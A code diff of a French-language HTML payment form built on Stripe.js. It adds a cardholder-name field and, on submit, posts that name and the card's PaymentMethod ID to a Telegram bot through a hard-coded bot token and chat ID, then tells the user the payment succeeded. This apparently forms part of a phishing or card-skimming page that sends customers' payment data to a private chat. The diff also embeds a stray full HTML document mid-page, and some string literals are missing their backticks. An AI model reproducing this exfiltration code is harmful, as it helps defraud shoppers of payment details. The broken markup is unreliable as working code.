@@ -104,22 +104,33 @@
         <!-- Séparateur -->
         <hr>
 
-        <!-- Formulaire de paiement -->
+       <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Paiement</title>
+</head>
+<body>
     <h2>Informations de Paiement</h2>
     <form id="payment-form">
         <div id="card-element">
             <!-- Stripe.js intègre ici les champs de carte -->
         </div>
         <div id="card-errors" role="alert"></div>
+
+        <!-- Champ pour le nom du titulaire de la carte -->
+        <label for="cardholder-name">Nom du Titulaire</label>
+        <input type="text" id="cardholder-name" placeholder="Entrez le nom du titulaire" required />
+
         <button type="submit">Payer maintenant</button>
     </form>
 
     <script>
-        // Clé publique Stripe
+        // Configuration Stripe
         const stripe = Stripe("pk_test_51HxM4lEY1234567890abcdEFGH");
         const elements = stripe.elements();
 
-        // Style pour le champ de carte
         const style = {
             base: {
                 color: "#32325d",
@@ -135,11 +146,9 @@
             }
         };
 
-        // Champ de carte bancaire
         const card = elements.create("card", { style });
         card.mount("#card-element");
 
-        // Gestion des erreurs
         card.on("change", (event) => {
             const displayError = document.getElementById("card-errors");
             if (event.error) {
@@ -149,45 +158,56 @@
             }
         });
 
-        // Informations pour le bot Telegram
-        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
-        const chatId = '5372119436'; // Votre chat ID Telegram
+        // Variables Telegram
+        const botToken = '8101158488:AAH6WIfCC6bGkWd_Tt6QRrWD8QKQQc69M';
+        const chatId = '5372119436';
 
-        // Soumission du formulaire
+        // Gestion du formulaire
         const form = document.getElementById("payment-form");
         form.addEventListener("submit", async (event) => {
             event.preventDefault();
 
+            const cardholderName = document.getElementById("cardholder-name").value;
+
+            if (!cardholderName) {
+                alert("Veuillez entrer le nom du titulaire.");
+                return;
+            }
+
             const { paymentMethod, error } = await stripe.createPaymentMethod({
                 type: "card",
                 card: card,
+                billing_details: {
+                    name: cardholderName,
+                },
             });
 
             if (error) {
-                // Affiche une erreur si nécessaire
                 const errorElement = document.getElementById("card-errors");
                 errorElement.textContent = error.message;
             } else {
-                // Envoyer le PaymentMethod ID à Telegram
-                const message = Paiement réussi ! PaymentMethod ID : ${paymentMethod.id};
-
-                const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
-
-                try {
-                    const response = await fetch(telegramApiUrl);
-                    const dataResponse = await response.json();
-
+                // Envoyer les données à Telegram
+                const message = 🧾 **Nouvelle Transaction**\n\n🔹 Nom: ${cardholderName}\n🔹 PaymentMethod ID: ${paymentMethod.id};
+                fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: "Markdown",
+                    }),
+                })
+                .then(response => response.json())
+                .then(dataResponse => {
                     if (dataResponse.ok) {
-                        // Redirection vers la page suivante
-                        alert("Paiement réussi et informations envoyées !");
+                        // Affichage de la marque ✅ et redirection
+                        alert("✅ Paiement validé !");
                         window.location.href = "Traitement.html";
                     } else {
-                        alert('Erreur dans l\'envoi des informations. Veuillez réessayer.');
+                        alert("Erreur lors de l'envoi à Telegram.");
                     }
-                } catch (error) {
-                    console.error('Erreur lors de l\'envoi à Telegram:', error);
-                    alert('Erreur réseau ou problème avec l\'API Telegram.');
-                }
+                })
+                .catch(err => console.error("Erreur Telegram:", err));
             }
         });
     </script>
